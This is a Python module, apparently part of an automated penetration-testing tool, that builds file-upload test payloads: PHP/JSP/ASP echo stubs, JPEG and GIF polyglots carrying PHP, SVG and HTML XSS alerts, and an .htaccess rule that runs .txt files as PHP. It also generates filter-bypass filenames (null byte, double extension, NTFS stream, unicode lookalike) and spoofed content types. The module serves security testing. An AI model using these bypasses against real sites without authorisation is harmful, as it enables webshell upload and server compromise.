"""
Advanced File Upload Testing for AI-Pentester

ENHANCED: Now includes:
- 20+ file types for comprehensive testing
- Polyglot payloads (JPEG+PHP, GIF+PHP)
- Extension bypass techniques (double extension, null byte, case)
- Content-Type manipulation
- Magic byte injection
"""

import mimetypes
import os

# Standard safe test content
SAFE_CONTENT = b"UPLOAD_TEST_FILE\n"

# PHP shell-like content (safe - just echoes)
PHP_SAFE = b'<?php echo "UPLOAD_TEST_SUCCESS"; ?>'

# Polyglot JPEG+PHP (valid JPEG that contains PHP)
POLYGLOT_JPEG_PHP = (
    b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    b'<?php echo "POLYGLOT_SUCCESS"; ?>'
    b'\xff\xd9'
)

# Polyglot GIF+PHP
POLYGLOT_GIF_PHP = (
    b'GIF89a'
    b'<?php echo "POLYGLOT_SUCCESS"; ?>'
)

# SVG with script (XSS test)
SVG_XSS = b'''<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert('XSS')</script>
</svg>'''

# HTML file
HTML_CONTENT = b'<html><body><script>alert(1)</script></body></html>'


# =============================================================================
# FILE TYPE DEFINITIONS
# =============================================================================

FILE_TYPES = {
    # Basic executable extensions
    "php": {
        "extensions": [".php", ".php5", ".php7", ".phtml", ".phar"],
        "content": PHP_SAFE,
        "mime": "application/x-php",
        "risk": "critical"
    },
    "jsp": {
        "extensions": [".jsp", ".jspx", ".jsw", ".jsv"],
        "content": b'<%= "UPLOAD_TEST_SUCCESS" %>',
        "mime": "application/jsp",
        "risk": "critical"
    },
    "asp": {
        "extensions": [".asp", ".aspx", ".asa", ".asax", ".ascx", ".ashx", ".asmx"],
        "content": b'<% Response.Write("UPLOAD_TEST_SUCCESS") %>',
        "mime": "application/asp",
        "risk": "critical"
    },
    "cgi": {
        "extensions": [".cgi", ".pl", ".py", ".rb"],
        "content": b'#!/usr/bin/env python\nprint("UPLOAD_TEST_SUCCESS")',
        "mime": "application/x-cgi",
        "risk": "critical"
    },
    
    # Shell scripts
    "shell": {
        "extensions": [".sh", ".bash", ".zsh"],
        "content": b'#!/bin/bash\necho "UPLOAD_TEST_SUCCESS"',
        "mime": "application/x-sh",
        "risk": "high"
    },
    
    # Web files
    "html": {
        "extensions": [".html", ".htm", ".xhtml", ".shtml"],
        "content": HTML_CONTENT,
        "mime": "text/html",
        "risk": "medium"
    },
    "svg": {
        "extensions": [".svg", ".svgz"],
        "content": SVG_XSS,
        "mime": "image/svg+xml",
        "risk": "medium"
    },
    
    # Config files
    "htaccess": {
        "extensions": [".htaccess"],
        "content": b'AddType application/x-httpd-php .txt',
        "mime": "text/plain",
        "risk": "critical"
    },
    "config": {
        "extensions": [".config", ".conf", ".ini"],
        "content": b'[settings]\ntest=value',
        "mime": "text/plain",
        "risk": "medium"
    },
    
    # Polyglots
    "polyglot_jpeg": {
        "extensions": [".jpg", ".jpeg"],
        "content": POLYGLOT_JPEG_PHP,
        "mime": "image/jpeg",
        "risk": "high"
    },
    "polyglot_gif": {
        "extensions": [".gif"],
        "content": POLYGLOT_GIF_PHP,
        "mime": "image/gif",
        "risk": "high"
    },
    
    # Safe types (for baseline)
    "txt": {
        "extensions": [".txt"],
        "content": SAFE_CONTENT,
        "mime": "text/plain",
        "risk": "low"
    },
    "pdf": {
        "extensions": [".pdf"],
        "content": b'%PDF-1.4\n%UPLOAD_TEST',
        "mime": "application/pdf",
        "risk": "low"
    },
}


# =============================================================================
# BYPASS TECHNIQUES
# =============================================================================

def generate_bypass_filenames(base_name, extension):
    """
    Generate filename variations to bypass filters.
    
    Returns list of (filename, technique_name) tuples.
    """
    bypasses = []
    name = base_name or "test"
    ext = extension.lstrip(".")
    
    # 1. Normal
    bypasses.append((f"{name}.{ext}", "normal"))
    
    # 2. Double extension
    bypasses.append((f"{name}.jpg.{ext}", "double_ext_jpg"))
    bypasses.append((f"{name}.png.{ext}", "double_ext_png"))
    bypasses.append((f"{name}.txt.{ext}", "double_ext_txt"))
    
    # 3. Null byte (legacy, still works on some systems)
    bypasses.append((f"{name}.{ext}%00.jpg", "null_byte"))
    bypasses.append((f"{name}.{ext}\x00.jpg", "null_byte_raw"))
    
    # 4. Case variations
    bypasses.append((f"{name}.{ext.upper()}", "uppercase"))
    bypasses.append((f"{name}.{ext[0].upper()}{ext[1:]}", "mixed_case"))
    
    # 5. Trailing characters
    bypasses.append((f"{name}.{ext}.", "trailing_dot"))
    bypasses.append((f"{name}.{ext} ", "trailing_space"))
    bypasses.append((f"{name}.{ext}::$DATA", "ntfs_ads"))
    
    # 6. Special characters
    bypasses.append((f"{name}.{ext};.jpg", "semicolon"))
    bypasses.append((f"{name}.{ext}%20", "url_encoded_space"))
    
    # 7. Unicode tricks
    bypasses.append((f"{name}.{ext}\u200b", "zero_width_space"))
    bypasses.append((f"{name}.p\u0127p", "unicode_lookalike"))  # ħ looks like h
    
    return bypasses


def generate_content_type_bypasses(original_mime):
    """
    Generate Content-Type header variations.
    """
    return [
        original_mime,
        "image/jpeg",
        "image/png",
        "image/gif",
        "text/plain",
        "application/octet-stream",
        None,  # No content-type
    ]


# =============================================================================
# MAIN FUNCTIONS
# =============================================================================

def build_file(filename, file_type=None):
    """
    Build a file payload for upload testing.
    
    Args:
        filename: Target filename
        file_type: Optional type key from FILE_TYPES
    
    Returns:
        dict with filename, content, mime
    """
    if file_type and file_type in FILE_TYPES:
        ft = FILE_TYPES[file_type]
        return {
            "filename": filename,
            "content": ft["content"],
            "mime": ft["mime"],
            "risk": ft["risk"]
        }
    
    # Auto-detect from extension
    mime, _ = mimetypes.guess_type(filename)
    
    # Check if this is a known dangerous extension
    ext = os.path.splitext(filename)[1].lower()
    for type_key, type_info in FILE_TYPES.items():
        if ext in type_info["extensions"]:
            return {
                "filename": filename,
                "content": type_info["content"],
                "mime": mime or type_info["mime"],
                "risk": type_info["risk"]
            }
    
    return {
        "filename": filename,
        "content": SAFE_CONTENT,
        "mime": mime or "application/octet-stream",
        "risk": "low"
    }


def build_upload_payloads(max_payloads=30):
    """
    Build comprehensive upload test payloads.
    
    Returns list of payload dicts with:
    - filename
    - content
    - mime
    - technique
    - risk
    """
    payloads = []
    
    # Priority order: critical first
    priority_types = ["php", "jsp", "asp", "htaccess", "polyglot_jpeg", "polyglot_gif", "svg", "html"]
    
    for type_key in priority_types:
        if len(payloads) >= max_payloads:
            break
            
        ft = FILE_TYPES.get(type_key)
        if not ft:
            continue
        
        # Use first extension as base
        base_ext = ft["extensions"][0]
        
        # Generate bypass variations
        bypasses = generate_bypass_filenames("shell", base_ext)[:5]  # Top 5 bypasses per type
        
        for filename, technique in bypasses:
            if len(payloads) >= max_payloads:
                break
                
            payloads.append({
                "filename": filename,
                "content": ft["content"],
                "mime": ft["mime"],
                "technique": technique,
                "file_type": type_key,
                "risk": ft["risk"]
            })
    
    return payloads


def analyze_upload_response(resp, uploaded_filename=None):
    """
    Analyze upload response for success indicators.
    
    Enhanced detection for:
    - Direct success messages
    - File path disclosure
    - Storage location hints
    - Execution indicators
    """
    if resp.status_code not in (200, 201, 202):
        return False, "non_success_status"
    
    text = resp.text.lower()
    
    # Strong success indicators
    strong_signals = [
        "upload successful",
        "file uploaded",
        "upload complete",
        "successfully uploaded",
    ]
    
    for signal in strong_signals:
        if signal in text:
            return True, "strong_success_message"
    
    # Medium signals
    medium_signals = ["success", "uploaded", "stored", "saved"]
    for signal in medium_signals:
        if signal in text:
            return True, "medium_success_message"
    
    # Path disclosure (indicates file was stored)
    if uploaded_filename:
        name_without_ext = os.path.splitext(uploaded_filename)[0].lower()
        if name_without_ext in text:
            return True, "filename_reflected"
    
    # Storage hints
    storage_patterns = [
        "/uploads/", "/files/", "/media/", "/static/",
        "cdn", "s3.amazonaws", "storage", "blob"
    ]
    for pattern in storage_patterns:
        if pattern in text:
            return True, "storage_path_disclosed"
    
    # Execution indicator (critical!)
    execution_markers = [
        "upload_test_success",
        "polyglot_success",
    ]
    for marker in execution_markers:
        if marker in text:
            return True, "code_executed"
    
    return False, "no_success_indicator"


def infer_storage_signal(resp_text):
    """
    Extract storage location hints from response.
    """
    indicators = []
    patterns = [
        "uploads/", "/files/", "/media/", "cdn", 
        "s3", "bucket", "blob", "storage/", "/static/"
    ]
    
    text_lower = resp_text.lower()
    for pattern in patterns:
        if pattern in text_lower:
            indicators.append(pattern)
    
    return indicators


def get_test_filenames():
    """
    Get list of all test filenames for comprehensive testing.
    
    Returns 20+ filenames covering various bypass techniques.
    """
    filenames = []
    
    # Critical extensions with bypasses
    critical_exts = [".php", ".jsp", ".asp"]
    for ext in critical_exts:
        bypasses = generate_bypass_filenames("shell", ext)
        filenames.extend([b[0] for b in bypasses[:4]])
    
    # Polyglots
    filenames.extend([
        "image.jpg",      # Normal JPEG (contains PHP)
        "image.gif",      # Normal GIF (contains PHP)
    ])
    
    # Config files
    filenames.extend([
        ".htaccess",
        "web.config",
    ])
    
    # SVG with XSS
    filenames.append("image.svg")
    
    # HTML
    filenames.append("page.html")
    
    return filenames[:25]  # Max 25 files
